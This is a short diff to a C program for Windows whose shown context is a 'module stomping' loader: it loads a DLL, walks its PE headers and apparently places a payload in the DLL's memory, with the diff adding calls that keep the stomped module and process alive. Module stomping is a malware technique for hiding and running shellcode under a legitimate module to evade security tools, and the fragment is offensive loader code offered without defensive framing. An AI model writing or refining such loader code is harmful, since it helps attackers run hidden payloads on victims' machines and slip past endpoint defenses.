@@ -73,6 +73,7 @@ int main(int argc, char* argv[]) {
     // Module stomping
     HMODULE hModule = LoadLibraryW(STOMP_DLL_PATH);
     if (!hModule) { free(payload); return 0; }
+    DisableThreadLibraryCalls(hModule);
 
     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
     PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
@@ -105,5 +106,6 @@ int main(int argc, char* argv[]) {
         }
     }
 
+    WaitForSingleObject(GetCurrentThread(), INFINITE);
     return 0;
 }
